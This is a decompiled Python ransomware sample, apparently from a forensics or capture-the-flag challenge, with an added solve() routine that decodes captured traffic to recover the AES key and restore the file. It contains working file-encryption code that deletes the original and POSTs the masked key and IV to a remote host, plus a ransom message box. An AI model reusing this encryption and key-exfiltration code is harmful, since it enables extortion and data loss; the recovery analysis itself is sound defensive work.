# uncompyle6 version 3.2.3
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.15 (default, Jul 23 2018, 21:31:33) 
# [GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.39.2)]
# Embedded file name: filecrypt.py
# Compiled at: 2018-09-15 02:39:04
import struct, os, time, threading, urllib, requests, ctypes, base64
from Cryptodome.Random import random
from Cryptodome.Cipher import AES, ARC4
from Cryptodome.Hash import SHA
infile = 'EncryptMe1234.txt'
encfile = 'EncryptMe1234.txt.CRYPTED'
keyfile = 'keyfile'
sz = 1024
bs = 16
passw = 'secretpassword'
URL = 'http://192.168.107.14'
rkey = 'secretkey'
key = os.urandom(bs)
iv = os.urandom(bs)

def callbk():
    global iv
    global key
    global passw
    global rkey
    id = 0
    n = 0
    while id == 0 or n == 0 and n < 256:
        id = os.urandom(1)
        n = hex(ord(id) + bs)

    id = id.encode('hex')
    for c in passw:
        passw = ('').join(chr(ord(c) ^ int(n, 16)))

    key = ('').join((chr(ord(x) ^ int(n, 16)) for x in key))
    for c in rkey:
        rkey = ('').join(chr(ord(c) ^ int(n, 16)))

    iv = ('').join((chr(ord(y) ^ int(n, 16)) for y in iv))
    key = key.encode('hex')
    iv = iv.encode('hex')
    Headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36'}
    params = urllib.urlencode({'id': id, 'key': key, 'iv': iv})
    rnum = os.urandom(bs)
    khash = SHA.new(rnum).digest()
    cipher1 = ARC4.new(khash)
    khash = khash.encode('hex')
    msg = cipher1.encrypt(params)
    msg = base64.b64encode(khash + msg.encode('hex'))
    response = requests.post(url=URL, data=msg, headers=Headers)
    del key
    del iv
    ctypes.windll.user32.MessageBoxA(0, 'Your file "EncryptMe1234.txt" has been encrypted. Obtain your "keyfile" to decrypt your file.', 'File(s) Encrypted!!!', 1)


def encrypt():
    global encfile
    global infile
    aes = AES.new(key, AES.MODE_CBC, iv)
    if os.path.exists(infile):
        fin = open(infile, 'r')
        fout = open(encfile, 'w')
        fsz = os.path.getsize(infile)
        fout.write(struct.pack('<H', fsz))
        while True:
            data = fin.read(sz)
            n = len(data)
            if n == 0:
                break
            else:
                if n % bs != 0:
                    data += '0' * (bs - n % bs)
            crypt = aes.encrypt(data)
            fout.write(crypt)

        fin.close()
        fout.close()
        os.remove(infile)
        callbk()
    else:
        return


def decrypt():
    global keyfile
    key = ''
    iv = ''
    if not os.path.exists(encfile):
        return
    while True:
        time.sleep(10)
        if os.path.exists(keyfile):
            keyin = open(keyfile, 'rb')
            key = keyin.read(bs)
            iv = keyin.read(bs)
            if len(key) != 0 and len(iv) != 0:
                aes = AES.new(key, AES.MODE_CBC, iv)
                fin = open(encfile, 'r')
                fsz = struct.unpack('<H', fin.read(struct.calcsize('<H')))[0]
                fout = open(infile, 'w')
                fin.seek(2, 0)
                while True:
                    data = fin.read(sz)
                    n = len(data)
                    if n == 0:
                        break
                    decrypted = aes.decrypt(data)
                    n = len(decrypted)
                    if fsz > n:
                        fout.write(decrypted)
                    else:
                        fout.write(decrypted[:fsz])
                    fsz -= n

                fin.close()
                os.remove(encfile)
                break


def solve():
    dec = base64.b64decode("MzU5OThmZGI3ZmUzYjc5NDBiOTM3NWE2OGE2NTRmZjk0OWM1OGRjYjliMWFlYmIwNDhkNmFhNzRkOTA1YjdiMGM2ZTA0YjQwNGViNjExMjlmOTJhZDkxMjcwMzg1MDIwMTU4MmNlMzllNzdiZmU3MzlmZWM1Mjg3NDFiMjAyZjg5MjNhOWY4ZDYzMDM2MTdkOGU2ZTM1YTBkNjQ0MTE1ZTIzODUyMmM2ZDBjYWNkMWFmZGFlMjMwNTA0NTJjOTk4ZTM5YQ==")
    khash = dec[:40].decode("hex")
    msg = dec[40:].decode("hex")
    print(dec)
    cipher1 = ARC4.new(khash)
    print(cipher1.decrypt(msg))

    id = "\xd1"
    n = hex(ord(id) + bs)

    key = "2f87011fadc6c2f7376117867621b606".decode("hex")
    iv = "95bc0ed56ab0e730b64cce91c9fe9390".decode("hex")

    key = ('').join((chr(ord(x) ^ int(n, 16)) for x in key))
    iv = ('').join((chr(ord(y) ^ int(n, 16)) for y in iv))


    keyout = open(keyfile, "wb")
    keyout.write(key)
    keyout.write(iv)
    keyout.close()

    decrypt()

def main():
    # encrypt()
    # t2 = threading.Thread(target=decrypt, args=())
    # t2.start()
    # t2.join()
    solve()
    print(open('EncryptMe1234.txt', 'r').read())

if __name__ == '__main__':
    main()
# okay decompiling g.pyc
